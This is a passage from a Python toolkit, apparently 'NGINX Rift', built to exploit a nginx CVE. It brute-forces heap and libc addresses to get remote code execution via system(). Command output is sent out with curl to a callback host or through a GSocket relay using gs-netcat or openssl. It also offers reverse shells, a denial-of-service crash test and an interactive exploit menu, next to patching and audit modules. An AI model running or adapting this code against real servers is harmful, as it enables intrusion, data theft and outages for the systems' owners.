                result.winning_try = t
                return result
            time.sleep(0.3)

    return result


def mode_exploit_32(host: str, port: int, cmd: str,
                    callback_ip: str, callback_port: int,
                    heap_page_min: int, heap_page_max: int,
                    libc_page_min: int, libc_page_max: int,
                    system_off: int, spray_internal_off: int,
                    n_plus: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    """32-bit brute-force RCE with callback (dinosn style)."""
    from concurrent.futures import ThreadPoolExecutor, as_completed

    safe_pages = []
    for hp in range(heap_page_min, heap_page_max + 1):
        spray_addr = (hp << 12) + spray_internal_off
        if addr_safe_in_uri(spray_addr, 4):
            safe_pages.append(hp)

    if not safe_pages:
        return {"error": "no SAFE heap pages in range"}

    candidates = []
    for hp in safe_pages:
        spray_addr = (hp << 12) + spray_internal_off
        target_bytes = struct.pack("<I", spray_addr)
        data_addr = spray_addr + 12
        for lp in range(libc_page_min, libc_page_max + 1):
            system_addr = (lp << 12) + system_off
            candidates.append((system_addr, data_addr, target_bytes, hp, lp, spray_addr))

    log(f"32-bit: {len(candidates)} candidates ({len(safe_pages)} safe heap pages)", "info")

    state = CallbackState()
    listener_ready = threading.Event()
    listener = threading.Thread(
        target=_run_callback_listener,
        args=("0.0.0.0", callback_port, state, listener_ready),
        daemon=True,
    )
    listener.start()
    listener_ready.wait(5)

    command = f"{cmd}|curl -sm3 -d @- http://{callback_ip}:{callback_port}/rce".encode()

    if not wait_alive(host, port, 10, vhost=vhost, use_ssl=use_ssl):
        return {"error": "target unreachable"}

    for idx, cand in enumerate(candidates):
        system_addr, data_addr, _, hp, lp, spray_addr = cand
        body = b"\x00" + struct.pack("<III", system_addr, data_addr, 0)
        body += command + b"\x00"
        if len(body) > BODY_LEN:
            body = body[:BODY_LEN]
        else:
            body += b"\x00" * (BODY_LEN - len(body))

        ok = attempt_32(host, port, body, spray_addr, n_plus, vhost=vhost, use_ssl=use_ssl)
        if state.event.is_set():
            return {
                "success": True, "system_addr": hex(system_addr),
                "spray_addr": hex(spray_addr), "heap_page": hex(hp),
                "libc_page": hex(lp), "output": state.output,
                "attempts": idx + 1,
            }

        if not ok and not wait_alive(host, port, 5, vhost=vhost, use_ssl=use_ssl):
            wait_alive(host, port, 15, vhost=vhost, use_ssl=use_ssl)

        if (idx + 1) % 500 == 0:
            log(f"32-bit brute: {idx + 1}/{len(candidates)} candidates tried", "info")

    if state.event.wait(3):
        return {"success": True, "output": state.output}

    return {"success": False, "attempts_tried": len(candidates)}


class CallbackState:
    def __init__(self):
        self.event = threading.Event()
        self.output = None


class CallbackHandler(BaseHTTPRequestHandler):
    state = None
    def do_POST(self):
        if "/rce" not in self.path:
            self.send_response(404)
            self.end_headers()
            return
        n = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(n).decode("latin-1", errors="replace") if n else ""
        self.__class__.state.output = body
        self.__class__.state.event.set()
        self.send_response(200)
        self.end_headers()
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args):
        pass


def _run_callback_listener(bind_host, bind_port, state, ready):
    CallbackHandler.state = state
    srv = HTTPServer((bind_host, bind_port), CallbackHandler)
    srv.timeout = 1
    ready.set()
    while not state.event.is_set():
        srv.handle_request()
    srv.server_close()


# ─── GSocket / GSRN relay ────────────────────────────────────────────────────

def _gsrn_token(secret: str) -> bytes:
    """Derive 20-byte session token from shared secret (SHA-1)."""
    return hashlib.sha1(secret.encode("utf-8")).digest()


def _gsrn_connect(secret: str, gs_type: int,
                  host: str = GSRN_HOST, port: int = GSRN_PORT) -> socket.socket | None:
    """
    Low-level GSRN handshake.
    Wire format: [version 1B][type 1B][token 20B][reserved 8B] → expect 0x00 ACK.
    Returns wrapped TLS socket on success, None on failure.
    """
    pkt = bytes([_GS_VER, gs_type]) + _gsrn_token(secret) + b"\x00" * 8
    try:
        try:
            socket.getaddrinfo(host, port)
        except socket.gaierror:
            log(f"GSRN DNS failed for {host} — host not resolving", "err")
            return None
        raw = socket.create_connection((host, port), timeout=10)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = ctx.wrap_socket(raw, server_hostname=host)
        conn.sendall(pkt)
        ack = conn.recv(1)
        if ack and ack[0] == 0x00:
            return conn
        conn.close()
        log(f"GSRN handshake rejected (ack={ack.hex() if ack else 'none'})", "warn")
        return None
    except OSError as e:
        log(f"GSRN connect error [{host}:{port}]: {e}", "err")
        return None


class GSocketCallbackReceiver:
    """
    Out-of-band command output capture via GSRN relay.
    The Python script registers as LISTENER; the target connects as CONNECTOR
    using gs-netcat, and pipes command stdout through the relay to the script.

    No public IP required on the script side — only outbound access to the relay.

    Target side (requires gs-netcat on target):
        cmd | gs-netcat -q -s SECRET [-r RELAY_HOST -p RELAY_PORT]

    Target side (fallback — bash + openssl, no gs-netcat needed):
        see target_cmd_openssl()
    """

    def __init__(self, secret: str | None = None,
                 relay_host: str = GSRN_HOST, relay_port: int = GSRN_PORT,
                 relay_candidates: list[tuple[str, int]] | None = None):
        import secrets as _sec
        self.secret     = secret or _sec.token_hex(16)
        self.relay_host = relay_host
        self.relay_port = relay_port
        # Build candidate list: user-specified relay first, then global defaults as fallback
        if relay_candidates is not None:
            self._candidates = relay_candidates
        else:
            user_pair = (relay_host, relay_port)
            self._candidates = [user_pair] + [c for c in GSRN_RELAY_CANDIDATES if c != user_pair]
        self.output: str | None = None
        self._event  = threading.Event()
        self._ready  = threading.Event()
        self._thread: threading.Thread | None = None
        self._conn:   socket.socket | None = None

    # ── public API ──────────────────────────────────────────────────

    def start(self) -> bool:
        """Register with GSRN relay as listener. Returns True when relay-ready."""
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        return self._ready.wait(15)

    def wait(self, timeout: float = 60.0) -> str | None:
        """Block until output arrives or timeout. Returns output string or None."""
        self._event.wait(timeout)
        return self.output

    def stop(self):
        """Close relay connection."""
        if self._conn:
            try:
                self._conn.close()
            except OSError:
                pass

    def target_cmd(self, user_cmd: str) -> str:
        """Shell fragment for target — requires gs-netcat binary on target."""
        extra = ""
        if self.relay_host != GSRN_HOST or self.relay_port != GSRN_PORT:
            extra = f" -r {self.relay_host} -p {self.relay_port}"
        return f"{user_cmd} | gs-netcat -q -s {self.secret}{extra}"

    def target_cmd_openssl(self, user_cmd: str) -> str:
        """
        Shell fragment using openssl s_client — no gs-netcat needed.
        Sends the GSRN init packet as base64-decoded binary, then pipes output.
        Requires: bash, openssl on target.
        """
        pkt  = bytes([_GS_VER, _GS_CONN]) + _gsrn_token(self.secret) + b"\x00" * 8
        b64  = __import__("base64").b64encode(pkt).decode()
        return (
            f"({{"
            f"echo '{b64}' | base64 -d;"
            f" {user_cmd};"
            f"}} | openssl s_client -quiet"
            f" -connect {self.relay_host}:{self.relay_port}"
            f" 2>/dev/null)"
        )

    # ── internal ────────────────────────────────────────────────────

    def _run(self):
        conn = None
        for rh, rp in self._candidates:
            log(f"Trying GSRN relay {rh}:{rp} ...", "info")
            conn = _gsrn_connect(self.secret, _GS_LISTEN, rh, rp)
            if conn is not None:
                self.relay_host = rh
                self.relay_port = rp
                break

        if conn is None:
            log(
                "All GSRN relays failed. Alternatives:\n"
                "  * HTTP callback: select 'http' mode (needs your IP reachable from target)\n"
                "  * Custom relay:  enter a custom HOST:PORT at the GSRN relay prompt\n"
                f"  * DNS check:     nslookup {GSRN_HOST}",
                "err",
            )
            self._ready.set()
            return

        self._conn = conn
        log(f"GSRN listener ready  relay={self.relay_host}:{self.relay_port}"
            f"  secret={self.secret}", "ok")
        self._ready.set()

        chunks: list[bytes] = []
        try:
            conn.settimeout(120)
            while True:
                chunk = conn.recv(8192)
                if not chunk:
                    break
                chunks.append(chunk)
        except (socket.timeout, OSError):
            pass
        finally:
            try:
                conn.close()
            except OSError:
                pass

        if chunks:
            raw = b"".join(chunks)
            self.output = raw.decode("latin-1", errors="replace")
            self._event.set()


def mode_dos(host: str, port: int, overflow_size: int = 200, vhost: str = "l", use_ssl: bool = False) -> dict:
    """DoS verification (rheodev style)."""
    result = {"vulnerable": False, "crashed": False}
    result["alive_before"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if not result["alive_before"]:
        result["error"] = "target not reachable"
        return result

    num_chars = overflow_size // 2
    uri = b"+" * num_chars
    try:
        sock = socket.create_connection((host, port), timeout=5)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\nConnection:close\r\n\r\n")
            resp = s.recv(256)
            if b"502" in resp or b"500" in resp:
                result["crashed"] = True
    except OSError:
        result["crashed"] = True

    time.sleep(2)
    result["alive_after"] = server_alive(host, port, vhost=vhost, use_ssl=use_ssl)
    if result["crashed"] and result["alive_after"]:
        result["vulnerable"] = True

    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 3: PATCH & FIX
# ═══════════════════════════════════════════════════════════════════════

PATCH_COMMANDS = {
    "ubuntu": {
        "pre_check": "dpkg -l nginx 2>/dev/null | grep nginx || which nginx",
        "add_repo": "echo 'deb https://nginx.org/packages/ubuntu/ $(lsb_release -cs) nginx' > /etc/apt/sources.list.d/nginx.list; "
                    "curl -fsSL https://nginx.org/keys/nginx_signing.key | gpg --dearmor -o /etc/apt/trusted.gpg.d/nginx.gpg",
        "upgrade": "apt-get update -qq && apt-get install -y nginx=~1.30.1",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
        "pin": "apt-mark hold nginx",
    },
    "debian": {
        "upgrade": "apt-get update -qq && apt-get install -y --only-upgrade nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
    "centos": {
        "upgrade": "yum update -y nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
    "rhel": {
        "upgrade": "dnf update -y nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
    "almalinux": {
        "upgrade": "dnf update -y nginx",
        "verify": "nginx -v 2>&1",
        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
    },
}


def patch_server(host: str, port: int, user: str, password: str | None = None,
                 key_path: str | None = None, dry_run: bool = False,
                 target_version: str = "1.30.1") -> dict:
    """SSH remote patching (gagaltotal style)."""
    if not _HAS_PARAMIKO:
        return {"error": "paramiko not installed"}
    result = {"host": host, "status": "pending", "steps": []}

    def add_step(name: str, status: str, detail: str = ""):
        result["steps"].append({"step": name, "status": status, "detail": detail})

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if password:
            client.connect(host, port=port, username=user, password=password, timeout=15)
        elif key_path:
            k = paramiko.RSAKey.from_private_key_file(key_path)
            client.connect(host, port=port, username=user, pkey=k, timeout=15)
        else:
            return {"error": "no auth method provided"}

        add_step("connect", "ok", f"SSH to {host}:{port} as {user}")

        # Detect OS
        _, stdout, _ = client.exec_command("cat /etc/os-release 2>/dev/null | head -3")
        os_out = stdout.read().decode().lower()
        distro = None
        for d in PATCH_COMMANDS:
            if d in os_out:
                distro = d
                break
        if not distro:
            _, stdout, _ = client.exec_command("cat /etc/redhat-release 2>/dev/null")
            rh = stdout.read().decode().lower()
            if "centos" in rh: distro = "centos"
            elif "alma" in rh: distro = "almalinux"
            elif "red hat" in rh: distro = "rhel"
        if not distro:
            distro = "ubuntu"
        add_step("detect_os", "ok", distro)

        # Current version
        _, stdout, _ = client.exec_command("nginx -v 2>&1; echo '---'; /usr/sbin/nginx -v 2>&1")
        ver = stdout.read().decode()
        add_step("current_version", "ok", ver[:100])

        if dry_run:
            add_step("dry_run", "ok", "dry-run mode, no changes made")
            result["status"] = "dry-run"
            client.close()
            return result

        # Backup
        cmds = PATCH_COMMANDS.get(distro, PATCH_COMMANDS["ubuntu"])
        if "backup" in cmds:
            _, stdout, stderr = client.exec_command(cmds["backup"])
            add_step("backup", "ok", stdout.read().decode()[:100])

        # Upgrade
        if "upgrade" in cmds:
            add_step("upgrade", "running", f"target: {target_version}")
            _, stdout, stderr = client.exec_command(cmds["upgrade"], timeout=120)
            out = stdout.read().decode()[:200]
            err = stderr.read().decode()[:200]
            add_step("upgrade", "ok" if "error" not in err.lower() else "warn",
                     out + err)

        # Verify
        if target_version:
            _, stdout, _ = client.exec_command(f"nginx -v 2>&1 | grep {target_version}")
            verified = bool(stdout.read().decode().strip())
            add_step("verify", "ok" if verified else "warn",
                     f"nginx -v: {target_version} {'found' if verified else 'not found'}")

        # Reload
        if "reload" in cmds:
            _, stdout, stderr = client.exec_command(cmds["reload"], timeout=30)
            add_step("reload", "ok", stdout.read().decode()[:100] or stderr.read().decode()[:100])

        result["status"] = "patched"
        client.close()
    except Exception as e:
        result["status"] = "failed"
        add_step("error", "err", str(e))

    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 4: REPORT
# ═══════════════════════════════════════════════════════════════════════

def generate_html_scan_report(results: list[dict], out_path: str):
    """Generate HTML report from scan results (gagaltotal/MateusVerass style)."""
    vuln_count = sum(1 for r in results if r.get("vulnerable"))
    safe_count = sum(1 for r in results if r.get("vulnerable") == False)
    total = len(results)

    rows = ""
    for r in results:
        cls = "vuln" if r.get("vulnerable") else ("safe" if r.get("vulnerable") == False else "unknown")
        ver = r.get("nginx_version") or r.get("server") or "unknown"
        os_info = r.get("os", "N/A")
        rows += f"<tr class='{cls}'><td>{r['host']}</td><td>{ver}</td><td>{os_info}</td><td>{cls}</td></tr>"

    html = f"""<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><title>NGINX Rift — Scan Report</title>
<style>
body {{ font-family: -apple-system, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 2rem; }}
h1 {{ color: #58a6ff; }}
table {{ border-collapse: collapse; width: 100%; }}
th {{ background: #161b22; color: #58a6ff; padding: .5rem; text-align: left; border-bottom: 2px solid #30363d; }}
td {{ padding: .5rem; border-bottom: 1px solid #21262d; }}
tr.vuln td {{ border-left: 3px solid #f85149; }}
tr.safe td {{ border-left: 3px solid #3fb950; }}
.summary {{ display: flex; gap: 1rem; margin: 1rem 0; }}
.card {{ padding: 1rem; border-radius: 6px; background: #161b22; flex: 1; }}
.card h3 {{ margin: 0 0 .3rem 0; }}
.num {{ font-size: 2rem; font-weight: 700; }}
.green {{ color: #3fb950; }}
.red {{ color: #f85149; }}
</style></head><body>
<h1>NGINX Rift — Scan Report</h1>
<div class="summary">
  <div class="card"><h3>Total</h3><div class="num">{total}</div></div>
  <div class="card"><h3>Vulnerable</h3><div class="num red">{vuln_count}</div></div>
  <div class="card"><h3>Safe</h3><div class="num green">{safe_count}</div></div>
</div>
<table><thead><tr><th>Host</th><th>Version</th><th>OS</th><th>Status</th></tr></thead>
<tbody>{rows}</tbody></table>
</body></html>"""

    Path(out_path).write_text(html)
    log(f"Report saved: {out_path}", "ok")


def generate_json_report(data: dict, out_path: str):
    Path(out_path).write_text(json.dumps(data, indent=2, default=str))
    log(f"JSON saved: {out_path}", "ok")


def print_scan_results(results: list[dict]):
    if _HAS_RICH:
        c = get_console()
        table = Table(title="Scan Results", box=rich_box.ROUNDED)
        table.add_column("Host", style="cyan")
        table.add_column("Version", style="green")
        table.add_column("Vulnerable", style="yellow")
        for r in results:
            vuln = r.get("vulnerable")
            v_str = "YES" if vuln else ("NO" if vuln is False else "?")
            v_style = "red" if vuln else "green"
            table.add_row(r["host"], r.get("nginx_version", "?"),
                         f"[{v_style}]{v_str}[/]")
        c.print(table)
    else:
        for r in results:
            print(f"{r['host']:20s} {str(r.get('nginx_version', '?')):15s} "
                  f"{'VULN' if r.get('vulnerable') else 'safe'}")


# ═══════════════════════════════════════════════════════════════════════
# MODULE 5: WEB AUDIT (MateusVerass style)
# ═══════════════════════════════════════════════════════════════════════

def audit_headers(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    result = {}
    try:
        sock = socket.create_connection((host, port), timeout=5)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(8192)
            raw = data.decode("latin-1", errors="replace")
            for hdr, desc in SECURITY_HEADERS:
                m = re.search(rf'^{hdr}:\s*(.+)$', raw, re.I | re.M)
                result[hdr] = {"present": bool(m), "value": m.group(1).strip() if m else None,
                               "description": desc}
    except OSError as e:
        return {"error": str(e)}
    return result


def path_discovery(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    found = []
    for path in INTERESTING_PATHS:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                s.sendall(f"GET {path} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                data = s.recv(256)
                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                found.append({"path": path, "status": status})
        except OSError:
            pass
    return {"paths_found": found}


def tls_audit(host: str, port: int, vhost: str = None) -> dict:
    """Check TLS versions (1.0-1.3)."""
    result = {}
    import ssl
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    server_name = vhost or host

    versions = []
    for name, attr in [("TLSv1.0", "TLSv1"), ("TLSv1.1", "TLSv1_1"), 
                       ("TLSv1.2", "TLSv1_2"), ("TLSv1.3", "TLSv1_3")]:
        v = getattr(ssl.TLSVersion, attr, None)
        if v is not None:
            versions.append((name, v))

    with warnings.catch_warnings():
        warnings.simplefilter("ignore", DeprecationWarning)
        for ver_name, ver_const in versions:
            try:
                ctx.minimum_version = ver_const
                ctx.maximum_version = ver_const
                with socket.create_connection((host, port), timeout=3) as s:
                    with ctx.wrap_socket(s, server_hostname=server_name):
                        result[ver_name] = True
            except Exception:
                result[ver_name] = False
    return result


# ═══════════════════════════════════════════════════════════════════════
# MODULE 6: AUTOMATION
# ═══════════════════════════════════════════════════════════════════════

def auto_scan(subnet: str, port: int, user: str = "root",
              password: str | None = None, key_path: str | None = None,
              output: str | None = None) -> list[dict]:
    log(f"Auto-scan: {subnet} port {port}", "info")
    live_hosts = scan_subnet(subnet, port)
    results = []
    for h in live_hosts:
        svc = detect_service(h, port, vhost=h)
        if svc.get("alive"):
            if _HAS_PARAMIKO and (password or key_path):
                ssh = scan_ssh(h, port=22, user=user, password=password, key_path=key_path)
                svc.update(ssh)
            results.append(svc)

    if output:
        if output.endswith(".json"):
            generate_json_report({"scan_results": results}, output)
        elif output.endswith(".html"):
            generate_html_scan_report(results, output)

    print_scan_results(results)
    return results


def auto_patch(subnet: str, port: int, user: str = "root",
               password: str | None = None, key_path: str | None = None,
               dry_run: bool = False) -> list[dict]:
    log(f"Auto-patch: {subnet}", "info")
    live = scan_subnet(subnet, port)
    results = []
    for h in live:
        r = patch_server(h, port, user, password, key_path, dry_run)
        results.append(r)
        log(f"{h}: {r['status']}", "ok" if r['status'] == 'patched' else "err")
    return results


def auto_exploit(host: str, port: int, cmd: str, heap_base: int = 0,
                 libc_base: int = 0, system_off: int = DEFAULT_SYSTEM_OFFSET,
                 offsets: list[int] | None = None, vhost: str = "l", use_ssl: bool = False) -> ExploitResult:
    hb = heap_base or DEFAULT_HEAP_BASE
    lb = libc_base or DEFAULT_LIBC_BASE
    off = offsets or DEFAULT_HEAP_OFFSETS
    log(f"Auto-exploit: {host}:{port} vhost={vhost} ssl={use_ssl} cmd='{cmd}'", "info")
    result = mode_exploit(host, port, cmd, hb, lb, system_off, off, 10, vhost=vhost, use_ssl=use_ssl)
    if result.success:
        log(f"RCE confirmed! system('{cmd}') executed", "ok")
    else:
        log(f"Exploit failed: {result.error or 'no crash detected'}", "err")
    return result


# ═══════════════════════════════════════════════════════════════════════
# INTERACTIVE TUI
# ═══════════════════════════════════════════════════════════════════════

def run_interactive():
    """Rich-powered interactive menu."""
    if not _HAS_RICH:
        print("Interactive mode requires `rich`. Install: pip install rich")
        print("Fallback to CLI mode — see --help")
        return

    c = get_console()
    c.clear()
    c.print(BANNER, style="bold cyan")
    c.print("[dim]Interactive Super Toolkit — CVE-2026-42945[/dim]\n")

    while True:
        c.print(Panel.fit(
            "[1]  🚀  Scan Network (subnet discovery)\n"
            "[2]  🔍  Check Target (fingerprint + vuln check)\n"
            "[3]  💥  Exploit Target (RCE via heap spray)\n"
            "[4]  🖥  32-bit Brute Force (callback RCE)\n"
            "[5]  🛡  Patch Target (SSH remote patch)\n"
            "[6]  📋  Web Audit (headers, paths, TLS)\n"
            "[7]  🌐  CIDR Auto-Scan → Report\n"
            "[8]  ⚡  DoS Test (crash verification)\n"
            "[9]  📄  Generate Report (HTML/JSON)\n"
            "[10] 📦  Bulk Fingerprint + Vuln Check (target list)\n"
            "[0]  ❌  Exit",
            title="Menu", border_style="cyan"
        ))

        choice = Prompt.ask("Select", choices=["0","1","2","3","4","5","6","7","8","9","10"])

        if choice == "0":
            c.print("[yellow]Goodbye![/]")
            break

        elif choice == "1":
            subnet = Prompt.ask("CIDR subnet", default="192.168.1.0/24")
            port = int(Prompt.ask("Port", default=str(DEFAULT_PORT)))
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                          transient=True) as p:
                p.add_task("Scanning...", total=None)
                hosts = scan_subnet(subnet, port)
            if hosts:
                t = Table(title=f"Live hosts on port {port}")
                t.add_column("#", style="dim")
                t.add_column("Host", style="cyan")
                for i, h in enumerate(hosts, 1):
                    t.add_row(str(i), h)
                c.print(t)
            else:
                c.print("[yellow]No live hosts found.[/]")

        elif choice == "2":
            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                c.print("[red]Invalid target[/]")
                continue
            host, port, vhost, use_ssl = parsed
            with Progress(SpinnerColumn(), transient=True) as p:
                p.add_task("Checking...", total=None)
                check = mode_check(host, port, vhost=vhost, use_ssl=use_ssl)
                svc = detect_service(host, port, vhost=vhost, use_ssl=use_ssl)
                waf = detect_waf(host, port, vhost=vhost, use_ssl=use_ssl)
            c.print(Panel(json.dumps(check, indent=2)[:1000], title="Check Result"))
            c.print(f"[green]Server:[/] {svc.get('server', '?')}")
            if svc.get("redirect"):
                c.print(f"[yellow]Redirect detected:[/] {svc['redirect']}")
            if waf:
                c.print(f"[red]WAF detected: {', '.join(waf)}[/]")

        elif choice == "3":
            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                c.print("[red]Invalid target[/]")
                continue
            host, port, vhost, use_ssl = parsed
            use_shell = Confirm.ask("Use reverse shell?", default=False)

            cb_method:    str = "none"
            cb_state:     CallbackState | None = None
            gs_receiver:  GSocketCallbackReceiver | None = None
            l2_mode:      bool = False
            lport:        int = 1337

            if use_shell:
                shell_mode = Prompt.ask(
                    "Shell mode",
                    choices=["direct", "l2relay"],
                    default="direct",
                )
                if shell_mode == "l2relay":
                    l2_mode = True
                    l2_ip   = Prompt.ask("L2 Relay IP (Relay IP from gsocket-relay.sh)")
                    l2_port = int(Prompt.ask("L2 Relay Port", default="12345"))
                    l1_tok  = Prompt.ask("L1 GSocket Token (blank = placeholder)", default="")
                    l2_sec  = Prompt.ask("L2 Local Secret  (blank = placeholder)", default="")
                    cmd = build_l2_payload(l2_ip, l2_port)
                    show_l2relay_panel(l2_ip, l2_port, l1_tok, l2_sec, cmd)
                else:
                    lhost = Prompt.ask("Your IP", default="172.17.0.1")
                    lport = int(Prompt.ask("Listener port", default="1337"))
                    cmd = build_reverse_shell_cmd(lhost, lport)
            else:
                cmd = Prompt.ask("Command", default="id")
                cb_method = Prompt.ask(
                    "Capture output via",
                    choices=["none", "gsocket", "http"],
                    default="gsocket",
                )
                if cb_method == "gsocket":
                    gs_secret   = Prompt.ask("GSocket secret (blank = auto-generate)", default="")
                    gs_relay_str = Prompt.ask("GSRN relay", default=f"{GSRN_HOST}:{GSRN_PORT}")
                    _rh, _, _rp = gs_relay_str.partition(":")
                    gs_receiver = GSocketCallbackReceiver(
                        gs_secret or None, _rh, int(_rp) if _rp else GSRN_PORT
                    )
                    c.print("[dim]Connecting to GSRN relay...[/]")
                    if gs_receiver.start():
                        c.print(
                            f"\n[green]GSRN ready![/]  "
                            f"secret=[bold cyan]{gs_receiver.secret}[/]\n"
                            f"[dim]gs-netcat target cmd:[/] "
                            f"[bold]{gs_receiver.target_cmd(cmd)}[/]\n"
                            f"[dim]openssl fallback cmd:[/] "
                            f"[bold]{gs_receiver.target_cmd_openssl(cmd)}[/]\n"
                        )
                        cmd = gs_receiver.target_cmd(cmd)
                    else:
                        c.print(
                            "[red]GSRN connect failed[/] — all relays unreachable.\n"
                            "[dim]  Options:[/]\n"
                            "[dim]  • Switch capture to [/][bold]http[/][dim] (needs your public/reachable IP)[/]\n"
                            "[dim]  • Enter a custom relay (e.g. your own stunnel/socat listener)[/]\n"
                            f"[dim]  • Run: nslookup {GSRN_HOST}  to check DNS[/]"
                        )
                        gs_receiver = None
                        cb_method = "none"

                elif cb_method == "http":
                    cb_ip   = Prompt.ask("Your IP (reachable from target)", default="172.17.0.1")
                    cb_port = int(Prompt.ask("Callback port", default="9876"))
                    cb_state = CallbackState()
                    _cb_ready = threading.Event()
                    threading.Thread(
                        target=_run_callback_listener,
                        args=("0.0.0.0", cb_port, cb_state, _cb_ready),
                        daemon=True,
                    ).start()
                    _cb_ready.wait(5)
                    log(f"HTTP callback listener on :{cb_port}", "ok")
                    cmd = f"{cmd} | curl -sm5 -d @- http://{cb_ip}:{cb_port}/rce"

            if use_shell and not l2_mode:
                t = threading.Thread(target=run_shell_listener, args=(lport,), daemon=True)
                t.start()
                time.sleep(0.5)

            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as p:
                p.add_task("Exploiting...", total=None)
                result = mode_exploit(host, port, cmd, DEFAULT_HEAP_BASE,
                                     DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET,
                                     DEFAULT_HEAP_OFFSETS, 10, vhost=vhost, use_ssl=use_ssl)

            if result.success:
                c.print(f"\n[bold green]RCE CONFIRMED![/]  addr={result.winning_addr}")
                if cb_method == "gsocket" and gs_receiver:
                    c.print("[dim]Waiting for GSocket output (up to 30 s)...[/]")
                    out = gs_receiver.wait(30)
                    gs_receiver.stop()
                    if out:
                        c.print(Panel(out[:3000], title="[green]Command Output (GSocket)[/]"))
                    else:
                        c.print("[yellow]No output received — is gs-netcat / openssl available on target?[/]")
                        c.print(f"[dim]openssl fallback:[/] {gs_receiver.target_cmd_openssl(result.command_sent.split('|')[0].strip())}")
                elif cb_method == "http" and cb_state:
                    c.print("[dim]Waiting for HTTP callback (up to 15 s)...[/]")
                    if cb_state.event.wait(15):
                        c.print(Panel(str(cb_state.output)[:3000], title="[green]Command Output (HTTP)[/]"))
                    else:
                        c.print("[yellow]No HTTP callback received (timeout)[/]")
                elif use_shell and l2_mode:
                    c.print(Panel(
                        f"[green bold]Shell payload injected[/] — target is connecting to L2 relay.\n\n"
                        f"  Check your [bold]L1 machine[/] for incoming shell:\n"
                        f"  [bold cyan]gs-netcat -l -s \"{l1_tok or 'YOUR_L1_TOKEN'}\"[/]\n\n"
                        f"  [dim]L2 bridge must be running:[/]\n"
                        f"  [dim]gs-netcat -l -p {l2_port} -s \"{l2_sec or 'L2_SECRET'}\" |"
                        f" gs-netcat -s \"{l1_tok or 'L1_TOKEN'}\"[/]\n\n"
                        f"  [yellow]No shell?[/] [dim]Target may lack bash /dev/tcp —"
                        f" python3/nc fallback will be tried."
                        f" Make sure L1 listener is running BEFORE the next exploit attempt.[/]",
                        title="[bold green]L2 Relay — Shell Dispatched[/]",
                        expand=False,
                    ))
            else:
                c.print(f"[red]Exploit failed: {result.error or 'no crash'}[/]")

        elif choice == "4":
            target = Prompt.ask("Target (host:port)", default="127.0.0.1:19331")
            parsed = parse_target(target)
            if not parsed:
                c.print("[red]Invalid target[/]")
                continue
            host, port, vhost, use_ssl = parsed
            cb_ip = Prompt.ask("Callback IP", default="host.docker.internal")
            cb_port = int(Prompt.ask("Callback port", default="9876"))
            cmd = Prompt.ask("Command", default="id")
            c.print("[yellow]Starting 32-bit brute-force — this may take a while[/]")
            r = mode_exploit_32(host, port, cmd, cb_ip, cb_port,
                               DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
                               DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
                               DEFAULT_SYSTEM_OFF_32, DEFAULT_SPRAY_INTERNAL_OFF_32,
                               DEFAULT_N_PLUS_32, vhost=vhost, use_ssl=use_ssl)
            if r.get("success"):
                c.print(f"[green]RCE CONFIRMED! Output: {r.get('output')}[/]")
            else:
                c.print(f"[red]Brute-force exhausted: {r.get('attempts_tried', 0)} tries[/]")

        elif choice == "5":
            target = Prompt.ask("Target (host:port)", default="192.168.1.100")
            parsed = parse_target(target)
            if not parsed:
                c.print("[red]Invalid target[/]")
                continue
            host, _, _, _ = parsed
            user = Prompt.ask("SSH user", default="root")
            use_key = Confirm.ask("Use SSH key?", default=False)
